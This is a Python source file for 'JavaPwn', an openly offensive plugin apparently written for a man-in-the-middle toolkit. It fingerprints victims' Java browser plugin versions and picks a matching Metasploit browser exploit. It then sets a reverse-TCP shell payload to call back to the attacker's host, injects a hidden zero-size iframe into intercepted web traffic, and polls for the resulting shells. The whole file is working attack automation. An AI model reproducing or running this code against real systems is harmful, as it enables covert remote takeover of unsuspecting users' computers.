from plugins.plugin import Plugin
from plugins.BrowserProfiler import BrowserProfiler
from time import sleep
import libs.msfrpc as msfrpc
import string
import random
import threading
import logging
import sys

try:
    from configobj import ConfigObj
except:
    sys.exit('[-] configobj library not installed!')

requests_log = logging.getLogger("requests")  #Disables "Starting new HTTP Connection (1)" log message
requests_log.setLevel(logging.WARNING)


class JavaPwn(BrowserProfiler, Plugin):
    name = "JavaPwn"
    optname = "javapwn"
    desc = "Performs drive-by attacks on clients with out-of-date java browser plugins"
    has_opts = True

    def initialize(self, options):
        '''Called if plugin is enabled, passed the options namespace'''
        self.options = options
        self.msfip = options.msfip
        self.msfport = options.msfport
        self.rpcip = options.rpcip
        self.rpcpass = options.rpcpass
        self.javapwncfg = './config_files/javapwn.cfg' or options.javapwncfg

        if not self.msfip:
            sys.exit('[-] JavaPwn plugin requires --msfip')

        self.javacfg = ConfigObj(self.javapwncfg)

        self.javaVersionDic = {}
        for key, value in self.javacfg.iteritems():
            self.javaVersionDic[float(key)] = value

        self.sploited_ips = []  #store ip of pwned or not vulnarable clients so we don't re-exploit

        try:
            msf = msfrpc.Msfrpc({"host": self.rpcip})  #create an instance of msfrpc libarary
            msf.login('msf', self.rpcpass)
            version = msf.call('core.version')['version']
            print "[*] Successfully connected to Metasploit v%s" % version
        except Exception:
            sys.exit("[-] Error connecting to MSF! Make sure you started Metasploit and its MSGRPC server")

        #Initialize the BrowserProfiler plugin
        BrowserProfiler.initialize(self, options)

        print "[*] JavaPwn plugin online"
        t = threading.Thread(name='pwn', target=self.pwn, args=(msf,))
        t.setDaemon(True)
        t.start()  #start the main thread

    def rand_url(self):  #generates a random url for our exploits (urls are generated with a / at the beginning)
        return "/" + ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(5))

    def version2float(self, version):  #converts clients java version string to a float so we can compare the value to self.javaVersionDic
        v = version.split(".")
        return float(v[0] + "." + "".join(v[-(len(v)-1):]))

    def injectWait(self, msfinstance, url, client_ip):  #here we inject an iframe to trigger the exploit and check for resulting sessions
        #inject iframe
        logging.info("%s >> now injecting iframe to trigger exploit" % client_ip)
        self.html_payload = "<iframe src='http://%s:%s%s' height=0%% width=0%%></iframe>" % (self.msfip, self.msfport, url) #temporarily changes the code that the Browserprofiler plugin injects

        logging.info('%s >> waiting for ze shells, Please wait...' % client_ip)

        exit = False
        i = 1
        while i <= 30:  #wait max 60 seconds for a new shell
            if exit:
                break
            shell = msfinstance.call('session.list')  #poll metasploit every 2 seconds for new sessions
            if len(shell) > 0:
                for k, v in shell.items():
                    if client_ip in shell[k]['tunnel_peer']:  #make sure the shell actually came from the ip that we targeted
                        logging.info("%s >> Got shell!" % client_ip)
                        self.sploited_ips.append(client_ip)  #target successfuly exploited
                        exit = True
                        break
            sleep(2)
            i += 1

        if exit is False:  #We didn't get a shell
            logging.info("%s >> session not established after 30 seconds" % client_ip)

        self.html_payload = self.get_payload()  # restart the BrowserProfiler plugin

    def pwn(self, msfinstance):
        while True:
            if (len(self.dic_output) > 0) and self.dic_output['java_installed'] == '1':  #only choose clients that we are 100% sure have the java plugin installed and enabled

                brwprofile = self.dic_output  #self.dic_output is the output of the BrowserProfiler plugin in a dictionary format

                if brwprofile['ip'] not in self.sploited_ips:  #continue only if the ip has not been already exploited

                    vic_ip = brwprofile['ip']

                    client_version = self.version2float(brwprofile['java_version'])  #convert the clients java string version to a float

                    logging.info("%s >> client has java version %s installed! Proceeding..." % (vic_ip, brwprofile['java_version']))
                    logging.info("%s >> Choosing exploit based on version string" % vic_ip)

                    min_version = min(self.javaVersionDic, key=lambda x: abs(x-client_version))  #retrives the exploit with minimum distance from the clients version

                    if client_version < min_version:  #since the two version strings are now floats we can use the < operand

                        exploit = self.javaVersionDic[min_version]  #get the exploit string for that version

                        logging.info("%s >> client is vulnerable to %s!" % (vic_ip, exploit))

                        msf = msfinstance

                        #here we check to see if we already set up the exploit to avoid creating new jobs for no reason
                        jobs = msf.call('job.list')  #get running jobs
                        if len(jobs) > 0:
                            for k, v in jobs.items():
                                info = msf.call('job.info', [k])
                                if exploit in info['name']:
                                    logging.info('%s >> %s exploit already started' % (vic_ip, exploit))
                                    url = info['uripath']  #get the url assigned to the exploit
                                    self.injectWait(msf, url, vic_ip)

                        else:  #here we setup the exploit
                            rand_url = self.rand_url()  #generate a random url
                            rand_port = random.randint(1000, 65535)  #generate a random port for the payload listener


                            #generate the command string to send to the virtual console
                            #new line character very important as it simulates a user pressing enter
                            cmd = "use exploit/multi/browser/%s\n" % exploit
                            cmd += "set SRVPORT %s\n" % self.msfport
                            cmd += "set URIPATH %s\n" % rand_url
                            cmd += "set PAYLOAD generic/shell_reverse_tcp\n"  #chose this payload because it can be upgraded to a full-meterpreter (plus its multi-platform! Yay java!)
                            cmd += "set LHOST %s\n" % self.msfip
                            cmd += "set LPORT %s\n" % rand_port
                            cmd += "exploit -j\n"

                            logging.debug("command string:\n%s" % cmd)

                            try:
                                logging.info("%s >> sending commands to metasploit" % vic_ip)

                                #Create a virtual console
                                console_id = msf.call('console.create')['id']

                                #write the cmd to the newly created console
                                msf.call('console.write', [console_id, cmd])

                                logging.info("%s >> commands sent succesfully" % vic_ip)
                            except Exception, e:
                                logging.info('%s >> Error accured while interacting with metasploit: %s:%s' % (vic_ip, Exception, e))

                            self.injectWait(msf, rand_url, vic_ip)
                    else:
                        logging.info("%s >> client is not vulnerable to any java exploit" % vic_ip)
                        self.sploited_ips.append(vic_ip)
                        sleep(0.5)
                else:
                    sleep(0.5)
            else:
                sleep(0.5)

    def add_options(self, options):
        options.add_argument('--msfip', dest='msfip', help='IP Address of MSF')
        options.add_argument('--msfport', dest='msfport', default='8080', help='Port of MSF web-server [default: 8080]')
        options.add_argument('--rpcip', dest='rpcip', default='127.0.0.1', help='IP of MSF MSGRPC server [default: localhost]')
        options.add_argument('--rpcpass', dest='rpcpass', default='abc123', help='Password for the MSF MSGRPC server [default: abc123]')
        options.add_argument('--javapwncfg', type=file, help='Specify a config file [default: javapwn.cfg]')

    def finish(self):
        '''This will be called when shutting down'''
        msf = msfrpc.Msfrpc({"host": self.rpcip})
        msf.login('msf', self.rpcpass)

        jobs = msf.call('job.list')
        if len(jobs) > 0:
            print '[*] Stopping all running metasploit jobs'
            for k, v in jobs.items():
                msf.call('job.stop', [k])

        consoles = msf.call('console.list')['consoles']
        if len(consoles) > 0:
            print "[*] Closing all virtual consoles"
            for console in consoles:
                msf.call('console.destroy', [console['id']])
